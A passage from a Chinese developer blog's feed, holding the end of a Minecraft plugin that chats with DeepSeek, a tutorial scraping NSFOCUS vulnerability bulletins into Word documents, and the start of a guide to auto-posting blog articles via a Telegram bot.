json.load(file)</span><br><span class="line">        <span class="keyword">return</span> messages</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_history</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            messages =  json.load(file)</span><br><span class="line">        history = <span class="string">&quot;\n--------------------history--------------------\n&quot;</span></span><br><span class="line">        <span class="keyword">for</span> index, message <span class="keyword">in</span> <span class="built_in">enumerate</span>(messages):</span><br><span class="line">            history += <span class="string">f&quot;##<span class="subst">&#123;index&#125;</span>##: <span class="subst">&#123;message[<span class="string">&#x27;role&#x27;</span>]&#125;</span>: <span class="subst">&#123;message[<span class="string">&#x27;content&#x27;</span>]&#125;</span>\n&quot;</span></span><br><span class="line">        history += <span class="string">&quot;-----------------------------------------------\n&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.source.reply(history)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_message</span>(<span class="params">self, role: <span class="built_in">str</span>, user_input: <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            messages = json.load(file)</span><br><span class="line">        messages.append(&#123;<span class="string">&quot;role&quot;</span>: role, <span class="string">&quot;content&quot;</span>: user_input&#125;)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            json.dump(messages, file)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clear_history</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="variable language_">self</span>.history_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            json.dump(<span class="variable language_">self</span>.initial_message, file)</span><br><span class="line">        <span class="variable language_">self</span>.source.reply(<span class="string">&quot;Clear history&quot;</span>)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_load</span>(<span class="params">server: ServerInterface, old_module</span>):</span><br><span class="line">    server.register_help_message(<span class="string">&#x27;!!ds &lt;message&gt;&#x27;</span>, <span class="string">&#x27;与DeepSeek对话&#x27;</span>)</span><br><span class="line">    <span class="comment"># 使用现代命令构建方式</span></span><br><span class="line">    server.register_command(</span><br><span class="line">        <span class="type">Literal</span>(<span class="string">&#x27;!!dsp&#x27;</span>).then(</span><br><span class="line">            <span class="type">Literal</span>(<span class="string">&#x27;help&#x27;</span>).runs(get_help)</span><br><span class="line">        ).then(</span><br><span class="line">            <span class="type">Literal</span>(<span class="string">&#x27;history&#x27;</span>).runs(get_history)</span><br><span class="line">        ).then(</span><br><span class="line">            <span class="type">Literal</span>(<span class="string">&#x27;clear&#x27;</span>).runs(clear_history)</span><br><span class="line">        ).then(</span><br><span class="line">            GreedyText(<span class="string">&#x27;message&#x27;</span>).runs(get_user_content)</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_help</span>(<span class="params">source: CommandSource</span>):</span><br><span class="line">    source.reply(<span class="string">&quot;§a[DeepSeek]§r 命令：\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;§6!!dsp help§r 查看帮助\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;§6!!dsp history§r 查看历史消息\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;§6!!dsp clear§r 清空历史消息\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;§6!!dsp &lt;message&gt;§r 与DeepSeek对话&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_content</span>(<span class="params">source: CommandSource, context: CommandContext</span>):</span><br><span class="line">    message = context[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> source.is_player:</span><br><span class="line">        player_data = DataManager(source, source.player)</span><br><span class="line">        player_data.add_message(<span class="string">&quot;user&quot;</span>, message)</span><br><span class="line">        <span class="comment"># 给玩家直接回复</span></span><br><span class="line">        source.reply(<span class="string">f&quot;§a[DeepSeek]§r 收到你的消息：<span class="subst">&#123;message&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment"># DeepSeek回复</span></span><br><span class="line">        send_message = player_data.get_send_message()</span><br><span class="line">        response = send_message_to_ds(send_message)</span><br><span class="line">        source.reply(<span class="string">f&quot;§a[DeepSeek]§r <span class="subst">&#123;response&#125;</span>&quot;</span>)</span><br><span class="line">        player_data.add_message(<span class="string">&quot;assistant&quot;</span>, response)</span><br><span class="line">        <span class="comment"># 广播给所有玩家</span></span><br><span class="line">        <span class="comment"># source.get_server().execute(f&#x27;tellraw @a &#123;&#123;&quot;text&quot;:&quot;§6[系统广播]§r &#123;source.player&#125; 对DeepSeek说：&#123;message&#125;&quot;&#125;&#125;&#x27;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        source.reply(<span class="string">&quot;§c该命令只能由玩家使用&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_history</span>(<span class="params">source: CommandSource</span>):</span><br><span class="line">    player_data = DataManager(source, source.player)</span><br><span class="line">    player_data.get_history()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_history</span>(<span class="params">source: CommandSource</span>):</span><br><span class="line">    player_data = DataManager(source, source.player)</span><br><span class="line">    player_data.clear_history()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_message_to_ds</span>(<span class="params">send_message: <span class="built_in">str</span></span>):</span><br><span class="line">    client = OpenAI(api_key=key, base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>)</span><br><span class="line">    response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">    messages=send_message,</span><br><span class="line">    stream=<span class="literal">False</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> response.choices[<span class="number">0</span>].message.content</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ENDS">ENDS</h2><p>水平有限，代码写的很粗糙，但是也算是实现了曾经的愿望…</p><blockquote><p>世界生成算法吞下了我的十七岁。那封没寄出的信还在末地折跃门边缘，漂浮如未完成的红石电路。</p><p>当第一个AI村民说出预设外的对白，我忽然听见2022年的自己，在矿洞深处敲打铁轨的节奏。那些被放弃的坐标参数，正在基岩层下重新编译春天。</p></blockquote><h2 id="Update">Update</h2><ul class="lvl-0"><li class="lvl-2"><p>2025.3.1  v1.0.0发布</p></li><li class="lvl-2"><p>2025.3.2  v1.1.0发布，更改架构为多文件，允许使用配置文件</p></li><li class="lvl-2"><p>…</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft </tag>
            
            <tag> AI </tag>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬取绿盟漏洞通报</title>
      <link href="/posts/9b196f56.html"/>
      <url>/posts/9b196f56.html</url>
      
        <content type="html"><![CDATA[<h1>爬取绿盟漏洞通报</h1><p><a href="https://avd.aliyun.com/high-risk/list">阿里云漏洞库</a>url有加密，目前还没研究出怎么绕过。<a href="https://www.cnnvd.org.cn/">cnnvd</a>虽然公开xml文件，但是xml里的信息不全，没有漏洞修复建议。对爬虫了解不多，只会request。既想好爬又要信息全面，看了好几个漏洞库后发现<a href="http://www.nsfocus.net/index.php?act=sec_bug">绿盟</a>完美符合这两大要求。</p><h2 id="Step-1-获取页报告列表-test-py">Step.1 获取页报告列表 (<a href="http://test.py">test.py</a>)</h2><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227124753933.png" alt="image-20250227124753933"></p><p>列表页url结构：<code>http://www.nsfocus.net/index.php?act=sec_bug&amp;type_id=&amp;os=&amp;keyword=&amp;page=</code> + <code>页数</code></p><p>修改page参数即可爬取对应页的通报列表。</p><p>先尝试打印一下</p><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227125237532.png" alt="image-20250227125237532"></p><p>中文乱码，设置编码utf-8，再用bs解析一下</p><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227125932943.png" alt="image-20250227125932943"></p><p>成功获取页面内容，现在需要筛选 <code>日期(date)</code> <code>链接(link)</code> <code>标题(title)</code></p><p>列表在 <code>vul_list</code> 下的 <code>&lt;li&gt;</code> 内</p><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227125821724.png" alt="image-20250227125821724"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span> = soup.find(<span class="string">&#x27;ul&#x27;</span>, class_=<span class="string">&#x27;vul_list&#x27;</span>).find_all(<span class="string">&#x27;li&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227152835130.png" alt="image-20250227152835130"></p><p>提取三个信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> vul <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">    date = vul.find(<span class="string">&#x27;span&#x27;</span>).text</span><br><span class="line">    title = vul.find(<span class="string">&#x27;a&#x27;</span>).text</span><br><span class="line">    link = vul.find(<span class="string">&#x27;a&#x27;</span>)[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(date, title, link)</span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227153045845.png" alt="image-20250227153045845"></p><h2 id="Step2-获取报告详细信息-detail-py">Step2. 获取报告详细信息 (<a href="http://detail.py">detail.py</a>)</h2><p>为了让结构更清晰，在新的文件 <code>detail.py</code> 编写</p><p>报告页面url结构：<code>http://www.nsfocus.net</code> + <code>link</code></p><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227153525580.png" alt="image-20250227153525580"></p><p>先随意打印一页，能够正常抓取</p><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227153921548.png" alt="image-20250227153921548"></p><p>期望获得的内容为：</p><ul class="lvl-0"><li class="lvl-2"><p>标题(title)(可选，因为上一步已经获取到了)</p></li><li class="lvl-2"><p>受影响的系统(affected_systems)</p></li><li class="lvl-2"><p>描述(description)</p></li><li class="lvl-2"><p>建议(suggestion)</p></li></ul><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227160420685.png" alt="image-20250227160420685"></p><p>title和affected_systems很好获得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">title = soup.find(<span class="string">&#x27;div&#x27;</span>, align=<span class="string">&#x27;center&#x27;</span>).text</span><br><span class="line">affected_systems = soup.find(<span class="string">&#x27;blockquote&#x27;</span>).text.strip()</span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227160802972.png" alt="image-20250227160802972"></p><p>但是其他内容没有很明显的标志，基本都是 <code>br</code> ，通过 <code>split()</code> 分割会更简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = soup.find(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&#x27;vulbar&#x27;</span>).text</span><br><span class="line">description = text.split(<span class="string">&#x27;描述：&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&lt;**&gt;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">suggestion = text.split(<span class="string">&#x27;&lt;**&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;浏览次数&#x27;</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/dev/%E7%88%AC%E5%8F%96%E7%BB%BF%E7%9B%9F%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/image-20250227161131105.png" alt="image-20250227161131105"></p><p>将整个 <code>greb()</code> 函数修改为一个类 <code>Detail</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0&#x27;</span>&#125;</span><br><span class="line">base_url = <span class="string">r&#x27;http://www.nsfocus.net&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Detail</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url</span>):</span><br><span class="line">        <span class="variable language_">self</span>.url = base_url + url</span><br><span class="line">        response = requests.get(<span class="variable language_">self</span>.url, headers=headers)</span><br><span class="line">        response.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">        <span class="variable language_">self</span>.soup = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.vulbar = <span class="variable language_">self</span>.soup.find(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&#x27;vulbar&#x27;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.text = <span class="variable language_">self</span>.vulbar.text</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.soup.find(<span class="string">&#x27;div&#x27;</span>, align=<span class="string">&#x27;center&#x27;</span>).text</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_affected_systems</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.soup.find(<span class="string">&#x27;blockquote&#x27;</span>).text.strip()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_description</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.text.split(<span class="string">&#x27;描述：&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;建议：&#x27;</span>)[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;*&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;*&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_suggestion</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.text.split(<span class="string">&#x27;*&gt;建议：&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;浏览次数&#x27;</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>这样只需要调用访问函数即可</p><h2 id="Step3-写入文件">Step3. 写入文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> detail <span class="keyword">import</span> Detail</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> docx <span class="keyword">import</span> Document</span><br><span class="line"><span class="keyword">from</span> docx.oxml.ns <span class="keyword">import</span> qn</span><br><span class="line"><span class="keyword">from</span> docx.oxml <span class="keyword">import</span> OxmlElement</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pages = <span class="number">5</span></span><br><span class="line">output_dir = <span class="string">&#x27;output&#x27;</span></span><br><span class="line">os.makedirs(output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_paragraph_with_font</span>(<span class="params">document, text</span>):</span><br><span class="line">    paragraph = document.add_paragraph(text)</span><br><span class="line">    </span><br><span class="line">    run = paragraph.runs[<span class="number">0</span>]</span><br><span class="line">    run.font.name = <span class="string">&#x27;宋体&#x27;</span></span><br><span class="line">    run._element.rPr.rFonts.<span class="built_in">set</span>(qn(<span class="string">&#x27;w:eastAsia&#x27;</span>), <span class="string">&#x27;宋体&#x27;</span>)</span><br><span class="line">    run._element.rPr.rFonts.<span class="built_in">set</span>(qn(<span class="string">&#x27;w:ascii&#x27;</span>), <span class="string">&#x27;宋体&#x27;</span>)</span><br><span class="line">    run._element.rPr.rFonts.<span class="built_in">set</span>(qn(<span class="string">&#x27;w:hAnsi&#x27;</span>), <span class="string">&#x27;宋体&#x27;</span>)</span><br><span class="line">    run._element.rPr.rFonts.<span class="built_in">set</span>(qn(<span class="string">&#x27;w:cs&#x27;</span>), <span class="string">&#x27;宋体&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, pages+<span class="number">1</span>):</span><br><span class="line">    url = <span class="string">r&#x27;http://www.nsfocus.net/index.php?act=sec_bug&amp;type_id=&amp;os=&amp;keyword=&amp;page=&#x27;</span>+<span class="built_in">str</span>(page)</span><br><span class="line">    response = requests.get(url, headers=headers)</span><br><span class="line">    response.encoding = <span class="string">&#x27;utf-8&#x27;</span>  </span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="built_in">list</span> = soup.find(<span class="string">&#x27;ul&#x27;</span>, class_=<span class="string">&#x27;vul_list&#x27;</span>).find_all(<span class="string">&#x27;li&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> vul <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            date = vul.find(<span class="string">&#x27;span&#x27;</span>).text</span><br><span class="line">            title = vul.find(<span class="string">&#x27;a&#x27;</span>).text</span><br><span class="line">            link = vul.find(<span class="string">&#x27;a&#x27;</span>)[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">            sleep(<span class="number">3</span>)</span><br><span class="line">            detail = Detail(link)</span><br><span class="line">            document = Document()</span><br><span class="line"></span><br><span class="line">            core_properties = document.core_properties</span><br><span class="line">            core_properties.author = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">            heading = document.add_heading(title, level=<span class="number">0</span>)</span><br><span class="line">            heading_run = heading.runs[<span class="number">0</span>]</span><br><span class="line">            heading_run.font.name = <span class="string">&#x27;宋体&#x27;</span></span><br><span class="line">            r = heading_run._element</span><br><span class="line">            rPr = r.get_or_add_rPr()</span><br><span class="line">            eastAsia = OxmlElement(<span class="string">&#x27;w:eastAsia&#x27;</span>)</span><br><span class="line">            eastAsia.<span class="built_in">set</span>(qn(<span class="string">&#x27;w:val&#x27;</span>), <span class="string">&#x27;宋体&#x27;</span>)</span><br><span class="line">            rPr.append(eastAsia)</span><br><span class="line">            <span class="comment"># sleep(1)</span></span><br><span class="line">            add_paragraph_with_font(document, <span class="string">&#x27;受影响版本：&#x27;</span>)</span><br><span class="line">            add_paragraph_with_font(document, detail.get_affected_systems())</span><br><span class="line">            document.add_paragraph(<span class="string">&#x27;&#x27;</span>) </span><br><span class="line">            <span class="comment"># sleep(1)</span></span><br><span class="line">            add_paragraph_with_font(document, <span class="string">&#x27;描述：&#x27;</span>)</span><br><span class="line">            add_paragraph_with_font(document, detail.get_description())</span><br><span class="line">            <span class="comment"># sleep(1)</span></span><br><span class="line">            add_paragraph_with_font(document, <span class="string">&#x27;建议：\n&#x27;</span>)</span><br><span class="line">            add_paragraph_with_font(document, detail.get_suggestion())</span><br><span class="line">            document.save(os.path.join(output_dir, <span class="string">f&quot;<span class="subst">&#123;date&#125;</span>-<span class="subst">&#123;title&#125;</span>.docx&quot;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;发生错误: <span class="subst">&#123;title&#125;</span>  <span class="subst">&#123;link&#125;</span>, Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Dev </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo + TG bot 实现自动推送文章到telegram频道</title>
      <link href="/posts/a6f3e185.html"/>
      <url>/posts/a6f3e185.html</url>
      
        <content type="html"><![CDATA[<h1>Hexo + TG bot 实现自动推送文章到telegram频道</h1><blockquote><p>突发奇想，hexo能不能实现自动推送功能。选择tg主要是因为tg的bot很强大（对比tx的小肚鸡肠，已经非常不错了）。翻了一圈，发现基本都是基于github action实现的推送。对github action实在不熟悉，复现也失败了，可能是因为需要完全通过github action构建并更新（？。只能曲线救国，结合github action的例子和tg api doc，用shell脚本完成自动推送。</p></blockquote><p>核心流程为：<code>申请bot</code> → <code>编写shell(linux)</code> → <code>添加脚本启动</code></p><h2 id="申请tg-bot">申请tg bot</h2><p>首先添加一个叫 <a href="https://t.me/BotFather">BotFather</a> 的机器人，用来申请bot</p><p><img src="/assets/post_img/dev/Hexo_TG_bot_%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%88%B0telegram%E9%A2%91%E9%81%93/BotFather.png" alt="image-20250218230347122"></p><p><img src="/assets/post_img/dev/Hexo_TG_bot_%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%88%B0telegram%E9%A2%91%E9%81%93/start.png" alt="image-20250218230542295"></p><p>接下来会依次要求填写 <code>name</code> 和 <code>username</code></p><p><code>name</code> 和 <code>username</code> 是不同的。<code>name</code> 指bot显示的名字，<code>username</code> 指bot实际的名字(用来搜索的名字)</p><p><img src="/assets/post_img/dev/Hexo_TG_bot_%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%88%B0telegram%E9%A2%91%E9%81%93/createbot.png" alt="image-20250218230847351"></p><p>这里 <code>name</code> 为 <code>gubai's bot</code>，<code>username</code> 为 <code>gubai_blog_bot</code></p><p>申请成功后的消息中， <code>t.me/gubai_blog_bot</code> 可以访问bot，下面提供的token是这个bot的唯一标识，非常重要，不能泄露</p><p>但是访问bot发现没有任何响应，因为还没有编写逻辑</p><p><img src="/assets/post_img/dev/Hexo_TG_bot_%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%88%B0telegram%E9%A2%91%E9%81%93/startbot.png" alt="image-20250218231329072"></p><p>将bot拉入希望推送文章的频道/群组（别忘记给权限）</p><p><img src="/assets/post_img/dev/Hexo_TG_bot_%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%88%B0telegram%E9%A2%91%E9%81%93/invitebot.png" alt="image-20250219191834013"></p><p>tg中每个聊天窗口有一个独一无二的 <code>ChatID</code></p><p>邀请bot <a href="">@get_id_bot</a> 进入频道，发送命令 <code>/my_id@get_id_bot</code></p><p><img src="/assets/post_img/dev/Hexo_TG_bot_%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%88%B0telegram%E9%A2%91%E9%81%93/getid.png" alt="image-20250219192723201"></p><p>得到ChatID <code>-1002492764196</code></p><p>为了规范频道，可以将所有和bot交互内容都删除。至于用来获得id的bot，可以踢掉，也可以禁言</p><h2 id="编写shell">编写shell</h2><p>在任意目录看着顺眼的位置创建一个.sh文件，名字随意，这里是 <code>TG_push.sh</code>，给执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x TG_push.sh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">TG_BOT_TOKEN=xxx # 填入自己的bot token</span><br><span class="line">ChatID=xxx# 填入id</span><br></pre></td></tr></table></figure><p>推送的思路有很多种，这里列出我的两种思路。</p><ul class="lvl-0"><li class="lvl-2"><p>获取最新编辑的文件，提取title和addrlink，组成message发送</p></li><li class="lvl-2"><p>遍历所有 <code>./source/_posts</code>下的文件，利用<a href="https://hexo.io/zh-cn/docs/front-matter">hexo Front-matter</a>，自定义新的配置项 <code>push</code> (当然，也可以起其他key)，当该项为 <code>true</code> (当然，可以改为其他value) 时，获取title和addrlink</p></li></ul><p>第二种是后来想起Front-matter不被渲染后实践的，效果很好，比第一种方式稳定，而且支持多文章自选推送。</p><p>下面详细介绍第二种方式的实现，第一种方式的代码会放到最后。</p><p>设想格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">————————————</span><br><span class="line">主页：xxxxx</span><br><span class="line">博客：xxxxx</span><br><span class="line">————————————</span><br><span class="line">推送时间：xxxx</span><br><span 